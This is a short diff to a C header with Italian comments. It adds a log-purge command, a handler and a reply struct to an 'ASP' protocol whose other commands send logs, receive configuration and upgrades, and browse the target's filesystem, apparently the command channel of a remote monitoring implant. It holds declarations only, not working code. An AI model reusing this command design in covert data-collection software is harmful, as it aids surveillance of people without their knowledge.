@@ -16,6 +16,7 @@ extern BOOL ASP_SendLog(char *, DWORD);
 extern BOOL ASP_ReceiveConf(char *);
 extern BOOL ASP_GetFileSystem(DWORD *, fs_browse_elem **);
 extern BOOL ASP_SendStatus(DWORD log_count, UINT64 log_size);
+extern BOOL ASP_HandlePurge(long long *purge_time, DWORD *purge_size);
 
 // Valori di ritorno della funzione ASP_Poll()
 #define ASP_POLL_FETCHING 0
@@ -37,6 +38,7 @@ extern BOOL ASP_SendStatus(DWORD log_count, UINT64 log_size);
 #define PROTO_UPGRADE           (UINT)0x16      // Riceve un upgrade
 #define PROTO_FILESYSTEM        (UINT)0x19      // Riceve le richieste relative al filesystem
 #define PROTO_LOGSTATUS         (UINT)0x0b      // Invia il numero e la size dei log da spedire
+#define PROTO_PURGE				(UINT)0x1a		// Elimina i file di log vecchi o troppo grossi
 
 // Strutture inviate o ritornate via IPC al core
 typedef struct {
@@ -71,6 +73,11 @@ typedef struct {
 	DWORD log_count;
 	UINT64 log_size;
 } asp_request_stat;
+
+typedef struct {
+	long long purge_time;
+	DWORD purge_size;
+} asp_reply_purge;
 #pragma pack()
 
 typedef struct {
